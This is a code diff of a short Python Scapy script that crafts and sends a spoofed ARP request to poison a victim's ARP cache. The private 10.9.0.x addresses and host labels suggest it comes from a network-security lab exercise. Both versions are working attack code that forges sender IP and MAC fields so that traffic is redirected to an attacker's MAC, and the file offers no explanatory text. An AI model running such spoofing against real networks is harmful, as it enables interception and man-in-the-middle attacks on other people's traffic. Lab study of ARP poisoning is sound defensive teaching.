@@ -1,35 +1,25 @@
 #!/usr/bin/env python3
 from scapy.all import *
 
-# Correct IP for Host M (attacker)
-IP_M = "10.9.0.105" # Corrected IP for Host M (hostC)
-MAC_M_REAL = "02:42:0a:09:00:69" # Actual MAC of Host M
+# Fake details
+VICTIM_IP = "10.9.0.5"      # Target IP (who will get poisoned)
+TARGET_MAC = "02:42:0a:09:00:05"  # MAC of the target (victim)
+FAKE_IP = "10.9.0.7"        # Pretend to be this IP
+ATTACKER_MAC = "AA:BB:CC:DD:EE:FF"
 
-VICTIM_IP = "10.9.0.5" # Host A's IP
-MAC_A = "02:42:0a:09:00:05" # Host A's MAC
+print("SENDING SPOOFED ARP REQUEST...")
 
-FAKE_MAC = "aa:bb:cc:dd:ee:ff" # The MAC you want to inject
+# Craft Ethernet Frame
+ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC)
 
-print("Sending spoofed ARP request to Host A...")
-
-# Modify the Ethernet destination to target Host A
-# Option 1: Unicast to Host A
-ether = Ether(src=FAKE_MAC, dst=MAC_A)
-# Option 2: Broadcast (more common for requests that intend to update caches)
-# ether = Ether(src=FAKE_MAC, dst="ff:ff:ff:ff:ff:ff")
-
-
-# Your ARP payload logic:
-# This creates an ARP request FOR IP_M (10.9.0.105),
-# claiming that VICTIM_IP (10.9.0.5, which is Host A itself)
-# is at FAKE_MAC.
+# Craft ARP Request
 arp = ARP()
-arp.psrc = VICTIM_IP
-arp.hwsrc = FAKE_MAC
-arp.pdst = IP_M # ARP payload asks "Who has IP_M?"
-arp.op = 1      # ARP Request
+arp.op = 1  # 1 = ARP Request
+arp.hwsrc = ATTACKER_MAC
+arp.psrc = FAKE_IP
+arp.pdst = VICTIM_IP
+arp.hwdst = "00:00:00:00:00:00"  # Standard for ARP Request
 
-frame = ether/arp
-sendp(frame)
-
-print("Sent 1 packet.")
+# Combine and send
+packet = ether / arp
+sendp(packet)
